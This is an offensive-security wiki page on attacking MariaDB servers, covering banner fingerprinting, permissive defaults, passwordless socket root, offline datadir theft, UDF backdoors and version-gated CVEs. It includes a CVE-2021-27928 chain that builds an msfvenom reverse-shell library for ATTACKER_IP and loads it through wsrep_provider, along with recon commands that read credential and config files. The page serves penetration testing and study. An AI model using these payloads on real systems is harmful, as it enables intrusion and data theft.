---
technology: "MariaDB"
kind: implementation
audience: offensive-security
family: databases
parent-area: mysql
language: C/C++
homepage: https://mariadb.org
github-repo: https://github.com/MariaDB/server
status: evidence-gated (corpus: 9+ writeups with MariaDB-specific attack evidence)
provenance: "corpus-grounded (9+ MariaDB-divergence writeups) + upstream-verified (mariadb.org docs, CVE records). Pass 2 extension 2026-11-12: wsrep_provider section added — CVE-2021-27928 version gates verified against the CVE.org record and MariaDB release notes (10.2.37/10.3.28/10.4.18/10.5.9 fixes, MDEV-25179, Percona/wsrep-patched-MySQL scope, Oracle excluded)."
---

# MariaDB (the MySQL fork you actually meet on Linux)

> On Debian/Ubuntu targets, `3306/tcp open mysql` is MariaDB wearing the name — and its permissive defaults (`secure_file_priv` empty, root via `unix_socket`, plugin dir reachable) mean SQLi-to-RCE chains that Oracle's MySQL 5.7+ would have stopped dead.

*Implementation page of the [[mysql]] area — protocol-common attacks live there. This page covers what diverges.*

## Identity and fingerprint

MariaDB forked from MySQL 5.1 in 2009; versions run 5.5.x → 10.x → 11.x (the 10/11 jump is branding, not lineage — 10.6 is a peer of MySQL 8.0-era, not of MySQL 10). Banners to recognize:

```
3306/tcp open  mysql  MariaDB 10.3.23-MariaDB-1 (Debian)
10.6.12-MariaDB-0ubuntu0.22.10.1        # sqlmap/sql-shell @@version
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12
MariaDB [(none)]>                       # interactive client prompt
jdbc:mariadb://localhost:3306/dbname    # Java connector URL
5.5.5-10.4.12-MariaDB                   # compat handshake: leading 5.5.5- = MariaDB
```

The `-0ubuntu0` / `+deb12` packaging suffix is free OS recon — it selects the config layout and the distro's CVE patch level.

## Defaults that diverge from Oracle MySQL

| Default | MariaDB | Oracle MySQL | Attack consequence |
|---|---|---|---|
| `secure_file_priv` | **empty** (no restriction) | `/var/lib/mysql-files` (5.7+ Linux pkgs), `NULL` (standalone/Windows since 5.7.16) | `load_file()` and `INTO OUTFILE` to arbitrary daemon-writable paths work on MariaDB; usually jailed on MySQL |
| root@localhost auth | `unix_socket OR mysql_native_password USING 'invalid'` (10.4.3+; Debian/Ubuntu debs earlier via `auth_socket.so`) | password | Local OS root gets the SQL console passwordless: `sudo mysql` |
| default auth plugin | `mysql_native_password` (never adopted `caching_sha2_password`) | `caching_sha2_password` since 8.0.4 | MariaDB handshakes crack as `$mysqlna$`; old clients connect fine |
| config tree | `/etc/mysql/mariadb.cnf` → `conf.d/*.cnf` → `mariadb.conf.d/*.cnf` (`50-server.cnf` holds bind address, datadir) | `/etc/mysql/my.cnf` → `conf.d/` | Different files to read for `bind-address`, creds, plugin paths |
| data/log dirs | `/var/lib/mysql`, `/var/log/mariadb/` | `/var/lib/mysql`, `/var/log/mysql/` | Where shells and history live |

All of the above is upstream-documented (MariaDB KB/docs: unix_socket plugin page, "Differences in MariaDB in Debian (and Ubuntu)", Pluggable Authentication Overview; MySQL WL#6782 and 5.7.16 release notes).

## The MariaDB-specific moves

### 1. Passwordless root over the local socket
Debian 9+/Ubuntu 15.10+ packages and every MariaDB ≥10.4.3 make `root@localhost` authenticate via `unix_socket` (SO_PEERCRED uid match). You cannot use it over TCP, but any local shell running **as root** walks in with `sudo mysql` / `mysql -u root` and no password. Conversely: a root-owned cron that runs `mysqldump -u root` without `-p` is telling you root's creds live in `/root/.my.cnf` — read that file.

### 2. Offline attack on a stolen datadir
With filesystem read of `/var/lib/mysql` (backup shares, docker volumes, world-readable NFS), you do not need the running daemon: stand up your own MariaDB of the matching version, mount/copy the datadir, and start it with a config that neutralizes auth — the observed pattern is a drop-in `socket.cnf`:

```ini
[mariadb]
plugin-load-add = auth_socket.so
```
```bash
docker run --name mariadb -v /tmp/socket.cnf:/etc/mysql/mariadb.conf.d/socket.cnf \
  -v /tmp/mysql:/var/lib/mysql -d mariadb:10.3.31
docker exec -ti mariadb mysql        # root over the container socket, no password
```

`mysql_upgrade_info` in the datadir names the version to match. Faster still: grep the `.MYD`/`.ibd`/`aria` files for strings, or parse the `mysql.user` table offline — the goal is the same: user tables and app rows without ever touching the live port.

### 3. UDF into the MariaDB plugin dir
`SHOW VARIABLES LIKE '%plugin%'` on deb installs returns `/usr/lib/x86_64-linux-gnu/mariadb19/plugin/`-style paths. The classic chain (raptor_udf2) is fully protocol-common but the *path discovery* is fork-specific — see [[mysql-bug-bounty]] §UDF. Persistence note: rows in `mysql.func` referencing a `.so` outside the package set (`find / | grep libmysql.so`) are prior-attacker backdoors — expect `SELECT exec_cmd('id')` to work.

### 4. Version-gated CVE work (divergence discipline)
- **CVE-2012-2122** (any-password auth bypass, memcmp/SSE): MariaDB 5.1.x<5.1.62, 5.2.x<5.2.12, 5.3.x<5.3.6, 5.5.x<5.5.23 — MySQL ranges differ (5.1.63/5.5.24/5.6.6 fixes). Distro-built (Ubuntu 64-bit etc.), not official builds.
- MariaDB later lines carry their own advisory history (e.g. the 2021 window around 10.5/10.6 in-tree functions); always check the MariaDB security page for the exact 10.x build — never lift a MySQL CVE list onto a MariaDB banner or the reverse.

### 5. `wsrep_provider` library load — CVE-2021-27928 (SQL shell → OS commands)

MariaDB ships with Galera/wsrep support compiled in — including on servers that were never configured as a cluster. Any user holding SUPER can point `wsrep_provider` at a shared object on disk and the daemon `dlopen`s it immediately, no restart: the library's initialization code runs inside mysqld, as the account mysqld runs under (field-observed landing a root shell). `wsrep_notify_cmd` is the sibling trigger — a shell command the server executes on cluster-view changes.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf-so -o payload.so
# deliver payload.so to a server-writable path: file share, or SELECT UNHEX('...') INTO DUMPFILE
# with MariaDB's empty secure_file_priv (the same delivery route as the UDF chain in §3)
mysql -u <super-user> -p -h 198.51.100.x
SET GLOBAL wsrep_provider='/tmp/payload.so';    -- library loads -> payload runs
```

Version gates (upstream CVE record + MariaDB release notes): MariaDB **10.2 < 10.2.37, 10.3 < 10.3.28, 10.4 < 10.4.18, 10.5 < 10.5.9**; Percona Server and the wsrep patch for MySQL through 2021-03-03 are equally affected — Oracle MySQL is not (MDEV-25179 tracks the writable-variable issue). Gate discipline per §4: read the banner first, match it against the fix lines, then hunt a SUPER credential in app configs, monitoring configs, and `.my.cnf` files — the observed chain took the SQL password from a monitoring configuration file. A matched banner plus SUPER is the whole bug; report execution identity as "the mysqld account" unless you prove it runs as root.

## Recon quick hits on a MariaDB target

```bash
mysql -u root -h 198.51.100.x                    # try blank root first (old/loose installs)
mysql -u <leaked_user> -p'<leaked_pass>' -h 198.51.100.x
SELECT @@version, @@datadir, @@secure_file_priv, @@plugin_dir;
SELECT user, host, plugin FROM mysql.user;
SELECT * FROM mysql.func;                        # UDF backdoor check
cat /etc/mysql/mariadb.conf.d/50-server.cnf      # bind-address, datadir (needs shell)
cat /var/log/mariadb/mariadb.log                 # errors, restarts, loaded plugins
```

## Where to go next

- [[mysql]] — the area router: fingerprint dispatch table and the protocol-common surface.
- [[mysql-bug-bounty]] — phased methodology; every phase notes where MariaDB defaults change the odds.
